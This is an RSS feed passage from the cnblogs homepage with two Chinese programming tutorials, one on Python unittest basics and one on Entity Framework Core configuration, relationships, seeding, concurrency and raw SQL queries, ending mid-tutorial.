<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>python的单元测试代码编写流程 - skaarl</title>
<link>http://www.cnblogs.com/skaarl/p/9686793.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/skaarl/p/9686793.html</guid>
<description>&lt;p&gt;&lt;span&gt;单元测试:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;单元测试是对单独的代码块分别进行测试, 以确保它们的正确性, 单元测试主要还是由开发人员来做, 其余的集成测试和系统测试由专业的测试人员来做. python的单元测试代码编写主要记住以下几点:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1. 需要导入 unittest模块&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2. 需要继承自 unittest.TestCase 类&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3. 单元测试的代码函数名必须以test开头(其他语言也是如此)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;       4. 单元测试里由 setUp 和 tearDown 两个勾子函数&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 以下为代码实现举例:&lt;br/&gt; import unittest&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;class TestClass(unittest.TestCase):&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　def setUp(self):&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　# 该方法会首先执行,相当于测试前的准备工作&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　pass  &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　def tearDown(self):&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　# 该方法会在测试完成后执行, 相当于测试的扫尾工作&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　def test_app(self):&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　# 该方法为测试测试代码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;单元测试经常用到的断言方法:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertEqual             # 如果两个值相等, 则pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertNotEqual       # 如果两个值不相等, 则pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertTrue              # 如果bool值为True, 则pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertFalse             # 如果bool值为false, 则pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertIsNone           # 如果不存在,则pass&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　assertIsNotNone      # 存在,则pass&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 21 Sep 2018 07:30:00 +0000</pubDate>
<dc:creator>skaarl</dc:creator>
<og:description>单元测试: 单元测试是对单独的代码块分别进行测试, 以确保它们的正确性, 单元测试主要还是由开发人员来做, 其余的集成测试和系统测试由专业的测试人员来做. python的单元测试代码编写主要记住以下几</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/skaarl/p/9686793.html</dc:identifier>
</item>
<item>
<title>ASP.NET Core 中的 ORM 之 Entity Framework - 车骑</title>
<link>http://www.cnblogs.com/royzshare/p/9686706.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/royzshare/p/9686706.html</guid>
<description>&lt;p class=&quot;toc&quot;&gt;目录&lt;/p&gt;

&lt;p&gt;Entity Framework Core 是微软自家的 ORM 框架。作为 .Net Core 生态中的一个重要组成部分，它是一个支持跨平台的全新版本，用三个词来概况 EF Core 的特点：轻量级、可扩展、跨平台。&lt;/p&gt;
&lt;p&gt;目前 EF Core 支持的数据库：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Microsoft SQL Server&lt;/li&gt;
&lt;li&gt;SQLite&lt;/li&gt;
&lt;li&gt;Postgres (Npgsql)&lt;/li&gt;
&lt;li&gt;SQL Server Compact Edition&lt;/li&gt;
&lt;li&gt;InMemory (for testing purposes)&lt;/li&gt;
&lt;li&gt;MySQL&lt;/li&gt;
&lt;li&gt;IBM DB2&lt;/li&gt;
&lt;li&gt;Oracle&lt;/li&gt;
&lt;li&gt;Firebird&lt;/li&gt;
&lt;/ul&gt;
&lt;ol readability=&quot;23.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;新建一个 WebAPI 项目&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;&lt;strong&gt;通过 Nuget 安装 EF Core 引用&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// SQL Server
Install-Package Microsoft.EntityFrameworkCore.SqlServer&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其他数据库请查看：https://docs.microsoft.com/zh-cn/ef/core/providers/&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;添加实体&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    public List&amp;lt;Post&amp;gt; Posts { get; set; }
}

public class Post
{
    public int PostId { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }

    public int BlogId { get; set; }
    public Blog Blog { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;18&quot;&gt;
&lt;p&gt;&lt;strong&gt;添加数据库上下文&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BloggingContext : DbContext
{
    public DbSet&amp;lt;Blog&amp;gt; Blogs { get; set; }
    public DbSet&amp;lt;Post&amp;gt; Posts { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有两种方式配置数据库连接，一种是注册 Context 的时候提供 options。比较推荐这种方式。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BloggingContext : DbContext
{
    public BloggingContext(DbContextOptions&amp;lt;BloggingContext&amp;gt; options)
        : base(options)
    { }

    public DbSet&amp;lt;Blog&amp;gt; Blogs { get; set; }
    public DbSet&amp;lt;Post&amp;gt; Posts { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在 Startup 中配置&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public void ConfigureServices(IServiceCollection services)
{
    var connectionString = @&quot;Server=.;Database=Blogging;Trusted_Connection=True;&quot;;
    services.AddDbContext&amp;lt;BloggingContext&amp;gt;(o =&amp;gt; o.UseSqlServer(connectionString));

    services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_1);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一种是重载 OnConfiguring 方法提供连接字符串：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BloggingContext : DbContext
{
    public DbSet&amp;lt;Blog&amp;gt; Blogs { get; set; }
    public DbSet&amp;lt;Post&amp;gt; Posts { get; set; }

    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
    {
        optionsBuilder.UseSqlServer(@&quot;Server=.;Database=Blogging;Trusted_Connection=True;&quot;);
        base.OnConfiguring(optionsBuilder);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;&lt;strong&gt;在Controller 中使用 Context&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BlogsController : ControllerBase
{
    private readonly BloggingContext _context;

    public BlogsController(BloggingContext context)
    {
        _context = context;
    }

    // GET: api/Blogs
    [HttpGet]
    public IEnumerable&amp;lt;Blog&amp;gt; GetBlogs()
    {
        return _context.Blogs;
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;通过 Nuget 引入EF Core Tool 的引用&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Install-Package Microsoft.EntityFrameworkCore.Tools&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果需要使用 &lt;code&gt;dotnet ef&lt;/code&gt; 命令, 请添加 Microsoft.EntityFrameworkCore.Tools.DotNet&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;生成迁移&lt;/strong&gt;&lt;/p&gt;
打开Package Manager Console，执行命令 &lt;code&gt;Add-Migration InitialCreate&lt;/code&gt;。&lt;br/&gt;执行成功后会在项目下生成一个 Migrations目录，包含两个文件：
&lt;ul&gt;&lt;li&gt;BloggingContextModelSnapshot：当前Model的快照（状态）。&lt;/li&gt;
&lt;li&gt;20180828074905_InitialCreate：这里面包含着migration builder需要的代码，用来迁移这个版本的数据库。里面有Up方法，就是从当前版本升级到下一个版本；还有Down方法，就是从下一个版本再退回到当前版本。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;更新迁移到数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;执行命令 &lt;code&gt;Update-Database&lt;/code&gt;。&lt;br/&gt;如果执行成功，数据库应该已经创建成功了。现在可以测试刚才创建的WebAPI应用了。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;使用代码 &lt;code&gt;Database.Migrate();&lt;/code&gt; 可以达到同样的目的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code&gt;    public BloggingContext(DbContextOptions&amp;lt;BloggingContext&amp;gt; options)
        : base(options)
    {
        Database.Migrate();
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;实体建模&quot;&gt;实体建模&lt;/h2&gt;
&lt;p&gt;EF 根据对 Model 的配置生成表和字段，主要有三种配置方式：&lt;/p&gt;
&lt;ul readability=&quot;7.5&quot;&gt;&lt;li&gt;&lt;strong&gt;约定&lt;/strong&gt; 根据约定（Id 或者&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;Data Annotation 数据注解&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;

public class Blog
{
    [Key]
    [Column(&quot;BlogId&quot;)]
    public int BlogId { get; set; }
    [Required]
    [MaxLength(500)]
    public string Url { get; set; }
    public int Rating { get; set; }

    public List&amp;lt;Post&amp;gt; Posts { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Key&lt;/strong&gt;: 主键&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Required&lt;/strong&gt;：不能为空&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MinLength&lt;/strong&gt;：字符串最小长度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MaxLength&lt;/strong&gt;：字符串最大长度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;StringLength&lt;/strong&gt;：字符串最大长度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Timestamp&lt;/strong&gt;：rowversion，时间戳列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ConcurrencyCheck&lt;/strong&gt; 乐观并发检查列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Table&lt;/strong&gt; 表名&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Column&lt;/strong&gt; 字段名&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Index&lt;/strong&gt; 索引&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ForeignKey&lt;/strong&gt; 外键&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NotMapped&lt;/strong&gt; 不映射数据库中的任何列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;InverseProperty&lt;/strong&gt; 指定导航属性和实体关系的对应，用于实体中有多个关系映射。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;strong&gt;Fluent API&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过 Fluent API 在 IEntityTypeConfiguration 实现类里面配置实体：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Metadata.Builders;

public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    public List&amp;lt;Post&amp;gt; Posts { get; set; }
}

public class BlogConfiguration : IEntityTypeConfiguration&amp;lt;Blog&amp;gt;
{
    public void Configure(EntityTypeBuilder&amp;lt;Blog&amp;gt; builder)
    {
        builder.HasKey(t =&amp;gt; t.BlogId);

        builder.Property(t =&amp;gt; t.Url).IsRequired().HasMaxLength(500);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并在 Context 的 OnModelCreating 方法里面应用：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BloggingContext : DbContext
{
    public BloggingContext(DbContextOptions&amp;lt;BloggingContext&amp;gt; options)
        : base(options)
    {}

    public DbSet&amp;lt;Blog&amp;gt; Blogs { get; set; }
    public DbSet&amp;lt;Post&amp;gt; Posts { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);

        modelBuilder.ApplyConfiguration(new BlogConfiguration());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Fluent API 比数据注解有更高的优先级。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;实体关系&quot;&gt;实体关系&lt;/h2&gt;
&lt;ul readability=&quot;11&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;一对多关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Blog 和 Post 是一对多关系，在 PostConfiguration 里面添加如下配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    public List&amp;lt;Post&amp;gt; Posts { get; set; }
}

public class Post
{
    public int PostId { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }

    public int BlogId { get; set; }
    public Blog Blog { get; set; }
}

public class PostConfiguration : IEntityTypeConfiguration&amp;lt;Post&amp;gt;
{
    public void Configure(EntityTypeBuilder&amp;lt;Post&amp;gt; builder)
    {
        builder.HasOne&amp;lt;Blog&amp;gt;(p =&amp;gt; p.Blog)
            .WithMany(b =&amp;gt; b.Posts)
            .HasForeignKey(p =&amp;gt; p.BlogId)
            .OnDelete(DeleteBehavior.Cascade);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;strong&gt;一对一关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建一个实体类 PostExtension 做为 Post 的扩展表，它们之间是一对一关系。&lt;br/&gt;如果两个实体相互包括了对方的引用导航属性（本例中是 &lt;code&gt;PostExtension Extension&lt;/code&gt; 和 &lt;code&gt;Post Post&lt;/code&gt;）和外键属性 （本例中是 PostExtension 中的 &lt;code&gt;PostId&lt;/code&gt;），那 EF Core 会默认配置一对一关系的，当然也可以手动写语句（如注释的部分）。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Post
{
    public int PostId { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }

    public PostExtension Extension { get; set; }
}

public class PostExtension
{
    public int PostId { get; set; }
    public string ExtensionField1 { get; set; }

    public Post Post { get; set; }
}

public class PostExtensionConfiguration : IEntityTypeConfiguration&amp;lt;PostExtension&amp;gt;
{
    public PostExtensionConfiguration()
    {

    }

    public void Configure(EntityTypeBuilder&amp;lt;PostExtension&amp;gt; builder)
    {
        builder.HasKey(t =&amp;gt; t.PostId);

        //builder.HasOne(e =&amp;gt; e.Post)
        //    .WithOne(p =&amp;gt; p.Extension)
        //    .HasForeignKey&amp;lt;PostExtension&amp;gt;(e =&amp;gt; e.PostId)
        //    .OnDelete(DeleteBehavior.Cascade);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;多对多关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建一个实体类 Tag， 和 Blog 是多对多关系。一个 Blog 可以有多个不同 Tag，同时一个 Tag 可以用多个 Blog。&lt;br/&gt;EF Core 中创建多对多关系必须要声明一个映射的关系实体，所以我们创建 BlogTag 实体，并在 BlogTagConfiguration 配置了多对多关系。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    public IList&amp;lt;BlogTag&amp;gt; BlogTags { get; set; }
}

public class Tag
{
    public int TagId { get; set; }
    public string TagName { get; set; }

    public IList&amp;lt;BlogTag&amp;gt; BlogTags { get; set; }
}

public class BlogTag
{
    public int BlogId { get; set; }
    public Blog Blog { get; set; }

    public int TagId { get; set; }
    public Tag Tag { get; set; }
}

public class BlogTagConfiguration : IEntityTypeConfiguration&amp;lt;BlogTag&amp;gt;
{
    public void Configure(EntityTypeBuilder&amp;lt;BlogTag&amp;gt; builder)
    {
        builder.HasKey(bt =&amp;gt; new { bt.BlogId, bt.TagId });

        builder.HasOne&amp;lt;Blog&amp;gt;(bt =&amp;gt; bt.Blog)
            .WithMany(b =&amp;gt; b.BlogTags)
            .HasForeignKey(bt =&amp;gt; bt.BlogId);

        builder.HasOne&amp;lt;Tag&amp;gt;(bt =&amp;gt; bt.Tag)
            .WithMany(t =&amp;gt; t.BlogTags)
            .HasForeignKey(bt =&amp;gt; bt.TagId);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;种子数据&quot;&gt;种子数据&lt;/h2&gt;
&lt;p&gt;填充种子数据可以让我们在首次使用应用之前向数据库中插入一些初始化数据。有两种方法：&lt;/p&gt;
&lt;ul readability=&quot;11&quot;&gt;&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;通过实体类配置实现&lt;/strong&gt;&lt;br/&gt;在配置实体的时候可以通过&lt;code&gt;HasData&lt;/code&gt;方法预置数据，在执行&lt;code&gt;Update-Database&lt;/code&gt;命令时候会写入数据库。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BlogConfiguration : IEntityTypeConfiguration&amp;lt;Blog&amp;gt;
{
    public void Configure(EntityTypeBuilder&amp;lt;Blog&amp;gt; builder)
    {
        //Data Seeding
        builder.HasData(new Blog { BlogId = 1, Url = &quot;http://sample.com/1&quot;, Rating = 0 });
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;16&quot;&gt;
&lt;p&gt;&lt;strong&gt;统一配置&lt;/strong&gt;&lt;br/&gt;创建一个统一配置 SeedData 类， 然后在 Program.cs 中的 Main 中调用它。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public static class SeedData
{
    public static void Initialize(IServiceProvider serviceProvider)
    {
        using (var context = new BloggingContext(
            serviceProvider.GetRequiredService&amp;lt;DbContextOptions&amp;lt;BloggingContext&amp;gt;&amp;gt;()))
        {
            if (context.Blogs.Any())
                return; // DB has been seeded

            var blogs = new List&amp;lt;Blog&amp;gt;
            {
                new Blog
                {
                    Url = &quot;http://sample.com/2&quot;,
                    Rating = 0
                },
                new Blog
                {
                    Url = &quot;http://sample.com/3&quot;,
                    Rating = 0
                },
                new Blog
                {
                    Url = &quot;http://sample.com/4&quot;,
                    Rating = 0
                }
            };

            context.Blogs.AddRange(blogs);
            context.SaveChanges();
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;public class Program
{
    public static void Main(string[] args)
    {
        //CreateWebHostBuilder(args).Build().Run();
        var host = CreateWebHostBuilder(args).Build();

        using (var scope = host.Services.CreateScope())
        {
            var services = scope.ServiceProvider;
            try
            {
                SeedData.Initialize(services);
            }
            catch (Exception ex)
            {
                var logger = services.GetRequiredService&amp;lt;ILogger&amp;lt;Program&amp;gt;&amp;gt;();
                logger.LogError(ex, &quot;An error occurred seeding the DB.&quot;);
            }
        }

        host.Run();
    }

    public static IWebHostBuilder CreateWebHostBuilder(string[] args) =&amp;gt;
        WebHost.CreateDefaultBuilder(args)
            .UseStartup&amp;lt;Startup&amp;gt;();
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;并发管理&quot;&gt;并发管理&lt;/h2&gt;
&lt;p&gt;数据库并发指的是多个进程或用户同时访问或更改数据库中的相同数据的情况。 并发控制指的是用于在发生并发更改时确保数据一致性的特定机制。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;乐观并发&lt;/strong&gt;：无论何时从数据库请求数据，数据都会被读取并保存到应用内存中。数据库级别没有放置任何显式锁。数据操作会按照数据层接收到的顺序执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;悲观并发&lt;/strong&gt;：无论何时从数据库请求数据，数据都会被读取，然后该数据上就会加锁，因此没有人能访问该数据。这会降低并发相关问题的机会，缺点是加锁是一个昂贵的操作，会降低整个应用程序的性能。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;EF Core 默认支持&lt;em&gt;乐观并发控制&lt;/em&gt;，这意味着它将允许多个进程或用户独立进行更改而不产生同步或锁定的开销。 在理想情况下，这些更改将不会相互影响，因此能够成功。 在最坏的情况下，两个或更多进程将尝试进行冲突更改，其中只有一个进程应该成功。&lt;/p&gt;
&lt;ul readability=&quot;20.5&quot;&gt;&lt;li readability=&quot;26&quot;&gt;
&lt;p&gt;&lt;code&gt;ConcurrencyCheck&lt;/code&gt; / &lt;code&gt;IsConcurrencyToken&lt;/code&gt;&lt;br/&gt;ConcurrencyCheck 特性可以应用到领域类的属性中。当EF执行更新或删除操作时，EF Core 会将配置的列放在 where 条件语句中。执行这些语句后，EF Core 会读取受影响的行数。如果未影响任何行，将检测到并发冲突引发 DbUpdateConcurrencyException。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }

    [ConcurrencyCheck]
    public int Rating { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[HttpPut(&quot;{id}&quot;)]
public async Task&amp;lt;IActionResult&amp;gt; PutBlog([FromRoute] int id, [FromBody] Blog blog)
{
    if (!ModelState.IsValid)
    {
        return BadRequest(ModelState);
    }

    var dbModel = await _context.Blogs.FindAsync(id);
    dbModel.Url = blog.Url;
    dbModel.Rating = blog.Rating;

    try
    {
        await _context.SaveChangesAsync();
    }
    catch (DbUpdateConcurrencyException ex)
    {
        //todo: handle DbUpdateConcurrencyException
        throw ex;
    }

    return NoContent();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 SQL Server Profiler 查看生成的 SQL Update 语句。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec sp_executesql N'SET NOCOUNT ON;
UPDATE [Blogs] SET [Rating] = @p0, [Url] = @p1
WHERE [BlogId] = @p2 AND [Rating] = @p3;
SELECT @@ROWCOUNT;

',N'@p2 int,@p0 int,@p3 int,@p1 nvarchar(500)',@p2=1,@p0=999,@p3=20,@p1=N'http://sample.com/1'&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;15&quot;&gt;
&lt;p&gt;&lt;code&gt;Timestamp&lt;/code&gt; / &lt;code&gt;IsRowVersion&lt;/code&gt;&lt;br/&gt;TimeStamp特性可以应用到领域类中，只有一个字节数组的属性上面。每次插入或更新行时，由数据库生成一个新的值做为并发标记。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    [Timestamp]
    public byte[] Timestamp { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 SQL Server Profiler 查看生成的 SQL Update 语句。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec sp_executesql N'SET NOCOUNT ON;
UPDATE [Blogs] SET [Rating] = @p0
WHERE [BlogId] = @p1 AND [Timestamp] = @p2;
SELECT [Timestamp]
FROM [Blogs]
WHERE @@ROWCOUNT = 1 AND [BlogId] = @p1;

',N'@p1 int,@p0 int,@p2 varbinary(8)',@p1=1,@p0=8888,@p2=0x00000000000007D1&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;处理冲突的策略：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;忽略冲突并强制更新&lt;/strong&gt;：这种策略是让所有的用户更改相同的数据集，然后所有的修改都会经过数据库，这就意味着数据库会显示最后一次更新的值。这种策略会导致潜在的数据丢失，因为许多用户的更改都丢失了，只有最后一个用户的更改是可见的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;部分更新&lt;/strong&gt;：在这种情况中，我们也允许所有的更改，但是不会更新完整的行，只有特定用户拥有的列更新了。这就意味着，如果两个用户更新相同的记录但却不同的列，那么这两个更新都会成功，而且来自这两个用户的更改都是可见的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;拒绝更改&lt;/strong&gt;：当一个用户尝试更新一个记录时，但是该记录自从他读取之后已经被别人修改了，此时告诉该用户不允许更新该数据，因为数据已经被某人更新了。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;警告询问用户&lt;/strong&gt;：当一个用户尝试更新一个记录时，但是该记录自从他读取之后已经被别人修改了，这时应用程序就会警告该用户该数据已经被某人更改了，然后询问他是否仍然要重写该数据还是首先检查已经更新的数据。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;执行-sql-语句和存储过程&quot;&gt;执行 SQL 语句和存储过程&lt;/h2&gt;
&lt;p&gt;EF Core 使用以下方法执行 SQL 语句和存储过程：&lt;/p&gt;
&lt;ul readability=&quot;26&quot;&gt;&lt;li readability=&quot;34&quot;&gt;
&lt;p&gt;&lt;strong&gt;DbSet&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DbSet&amp;lt;TEntity&amp;gt;.FromSql()&lt;/code&gt; 返回值为IQueryable，可以与Linq扩展方法配合使用。注意：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;SQL 查询必须返回实体或查询类型的所有属性的数据&lt;/li&gt;
&lt;li&gt;结果集中的列名必须与属性映射到的列名称匹配。&lt;/li&gt;
&lt;li&gt;SQL 查询不能包含相关数据。 但是可以使用 Include 运算符返回相关数据。&lt;/li&gt;
&lt;li&gt;不要使用 TOP 100 PERCENT 或 ORDER BY 等子句。可以通过 Linq 在代码里面编写。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;基本 SQL 查询&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blogs = _context.Blogs.FromSql($&quot;select * from Blogs&quot;).ToList();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;带有参数的查询：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blog = _context.Blogs.FromSql($&quot;select * from Blogs where BlogId = {id}&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用 LINQ：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blogs = _context.Blogs.FromSql($&quot;select * from Blogs&quot;)
            .OrderByDescending(r =&amp;gt; r.Rating)
            .Take(2)
            .ToList();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 SQL Server Profiler 查看 SQL 语句，可以发现 EF Core 是把手工写的 SQL 语句和 Linq 合并生成了一条语句:&lt;/p&gt;
&lt;pre&gt;
